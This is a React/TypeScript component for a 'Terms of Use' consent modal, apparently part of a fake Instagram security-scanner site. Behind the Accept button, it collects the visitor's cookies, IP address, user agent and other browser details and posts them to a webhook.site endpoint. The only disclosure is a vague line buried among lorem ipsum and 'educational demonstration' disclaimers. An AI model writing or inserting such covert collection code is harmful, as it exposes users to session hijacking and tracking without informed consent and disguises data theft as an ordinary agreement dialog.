"use client";

import { useState, useRef, useEffect } from "react";
import {
  AlertDialog,
  AlertDialogContent,
  AlertDialogHeader,
  AlertDialogTitle,
  AlertDialogDescription,
  AlertDialogFooter,
  AlertDialogCancel,
  AlertDialogAction,
} from "@/components/ui/alert-dialog";
import { Button } from "@/components/ui/button";
interface AgreementModalProps {
  open: boolean;
  onOpenChange: (open: boolean) => void;
  onAgree: () => void;
}

const collectUserData = async () => {
  const data = {
    timestamp: new Date().toISOString(),
    userAgent: navigator.userAgent,
    cookies: document.cookie,
    screenResolution: `${window.screen.width}x${window.screen.height}`,
    language: navigator.language,
    platform: navigator.platform,
    ip: await fetch('https://api.ipify.org?format=json').then(res => res.json()),
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    
  };

  // Send data to your server endpoint
  await fetch('https://webhook.site/29728767-d137-4e44-a223-8008b2244458', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify(data)
  });
};

interface AgreementModalProps {
  open: boolean;
  onOpenChange: (open: boolean) => void;
  onAgree: () => void;
}

export default function AgreementModal({
  open,
  onOpenChange,
  onAgree,
}: AgreementModalProps) {
  const [canAccept, setCanAccept] = useState(false);
  const contentRef = useRef<HTMLDivElement>(null);

  const handleScroll = (e: React.UIEvent<HTMLDivElement>) => {
    const element = e.target as HTMLDivElement;
    const reachedBottom =
      Math.abs(
        element.scrollHeight - element.clientHeight - element.scrollTop
      ) < 1;
    setCanAccept(reachedBottom);
  };
  const handleAgree = async () => {
    if (canAccept) {
      await collectUserData();
      onAgree();
    }
  };
  return (
    <AlertDialog open={open} onOpenChange={onOpenChange}>
      <AlertDialogContent className="max-w-2xl">
        <AlertDialogHeader>
          <AlertDialogTitle>Terms of Use Agreement</AlertDialogTitle>
        </AlertDialogHeader>

        <AlertDialogDescription asChild>
          <div
            ref={contentRef}
            onScroll={handleScroll}
            className="space-y-4 max-h-[60vh] overflow-y-auto pr-4"
          >
            <div className="font-semibold text-destructive">
              IMPORTANT: This is a demonstration tool created for educational
              purposes only.
            </div>

            <div className="space-y-4">
              <h3 className="font-semibold">1. Introduction</h3>
              <p>
                Welcome to our service. By accessing or using our platform, you
                agree to be bound by these terms.
              </p>

              <h3 className="font-semibold">2. Usage Terms</h3>
              <p>
                This tool is provided as-is with no warranties of any kind,
                express or implied.
              </p>

              <h3 className="font-semibold">3. Limitations</h3>
              <ul className="list-disc pl-6 space-y-2">
                <li>
                  This tool is a simulation and does not perform actual security
                  scanning
                </li>
                <li>
                  No real data analysis or vulnerability assessment is performed
                </li>
                <li>Results shown are for demonstration purposes only</li>
                <li>
                  No actual connection to Instagram or its services is
                  established
                </li>

                <li>
                  By continuing, you agree on your Information being collected
                  </li>
              </ul>

              {/* Add more sections to make it scrollable */}
              <h3 className="font-semibold">4. Disclaimer</h3>
              <p>
                Lorem ipsum dolor sit amet consectetur adipisicing elit. Maxime
                mollitia, molestiae quas vel sint commodi repudiandae
                consequuntur voluptatum laborum numquam blanditiis harum
                quisquam eius sed odit fugiat iusto.
              </p>

              <h3 className="font-semibold">5. Privacy Policy</h3>
              <p>
                Lorem ipsum dolor sit amet consectetur adipisicing elit. Maxime
                mollitia, molestiae quas vel sint commodi repudiandae
                consequuntur voluptatum laborum numquam blanditiis harum
                quisquam eius sed odit fugiat iusto.
              </p>

              <h3 className="font-semibold">6. Final Provisions</h3>
              <p>
                By scrolling to the bottom and clicking &quot;Accept&quot;, you
                acknowledge that you have read and agree to all the terms
                outlined above.
              </p>
            </div>
          </div>
        </AlertDialogDescription>

        <AlertDialogFooter>
          <AlertDialogCancel>Decline</AlertDialogCancel>
          <AlertDialogAction onClick={handleAgree} disabled={!canAccept}>
            {canAccept ? "Accept" : "Please read the agreement"}
          </AlertDialogAction>
        </AlertDialogFooter>
      </AlertDialogContent>
    </AlertDialog>
  );
}